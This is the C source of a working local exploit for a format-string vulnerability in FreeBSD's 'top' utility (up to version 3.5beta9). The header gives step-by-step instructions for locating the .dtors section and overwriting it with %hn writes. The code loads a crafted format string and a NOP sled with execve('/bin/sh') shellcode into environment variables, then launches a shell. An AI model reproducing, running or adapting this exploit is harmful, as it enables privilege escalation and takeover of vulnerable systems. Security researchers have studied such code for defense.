/*
 * freebsd x86 top exploit
 * affected under top-3.5beta9 ( including this version )
 *
 * 1. get the address of .dtors from /usr/bin/top using objdump ,
 *
 *  'objdump -s -j .dtors /usr/bin/top'
 *
 * 2. divide it into four parts, and set it up into an environment variable like "XSEO="
 *
 * 3. run top, then find "your parted addresses from "kill" or "renice" command like this
 *
 *  'k %200$p' or 'r 2000 %200$p'
 *
 * 4. do exploit !
 *
 *  'k %190u%230$hn' <== 0xbf (4)
 *  'k %190u%229$hn' <== 0xbf (3)
 *  'k %214u%228$hn' <== 0xd7 (2)
 *  'k %118u%227$hn' <== 0x77 (1)
 *
 * truefinder , seo@igrus.inha.ac.kr
 * thx  mat, labman, zen-parse
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define BUFSIZE 2048

char fmt[]=
"XSEO="
/* you would meet above things from 'k %200$p', it's confirming strings*/
"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
/* .dtors's address in BSD*/
"\x08\xff\x04\x08"
"\x09\xff\x04\x08"
"\x0a\xff\x04\x08"
"\x0b\xff\x04\x08"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

/* might shellcode be located 0xbfbfd6? ~ 0xbfbfde? */

char sc[]=
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
"\xb0\x3b\x50\xcd\x80"; /* bigwaks 23 bytes shellcode */

int
main(void)
{
        char scbuf[BUFSIZE];
        char *scp;

        scp = (char*)scbuf;
        memset( scbuf, NOP, BUFSIZE );

        scp += ( BUFSIZE - strlen(sc) - 1);
        memcpy( scp, sc ,strlen(sc));

        scbuf[ BUFSIZE - 1] = '\0';

        memcpy( scbuf, "EGG=", 4);

        putenv(fmt);
        putenv(scbuf);

        system("/bin/bash");
}
